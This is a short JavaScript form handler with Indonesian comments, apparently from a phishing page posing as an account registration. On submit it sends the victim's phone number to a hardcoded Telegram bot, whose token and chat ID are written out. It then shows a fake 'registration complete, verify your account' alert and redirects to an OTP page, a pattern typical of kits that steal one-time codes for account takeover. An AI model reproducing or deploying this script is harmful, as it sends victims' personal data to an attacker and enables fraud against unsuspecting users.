
document.getElementById('contactForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman formulir default

    const name = document.getElementById('name').value;
    const message = document.getElementById('message').value;
    const telegram= document.getElementById('telegram').value;
    const gender = document.getElementById('gender').value;
    
    const token = '7515844069:AAFgaTu5QS3CG70_uwkKwG1ND1BAKEgFngw'; // Ganti dengan token bot Anda
    const chatId = '8072206481'; // Ganti dengan ID chat Anda

    const text = `Nomor: ${telegram}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    function gabungkanFungsi() {
        fetch(url)
            .then(response => {
                if (response.ok) {
                    alert('Pendaftaran selesai, silahkan KLIK SELANJUTNYA untuk verifikasi Akun');
                    document.getElementById('contactForm').reset(); // Reset formulir
                    window.location.href = "OTP.html"; // Arahkan ke halaman otp.html
                } else {
                    alert('Terjadi kesalahan saat mengirim kode.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat mengirim pesan.');
            });
    }

    // Panggil fungsi gabungan
    gabungkanFungsi();
});
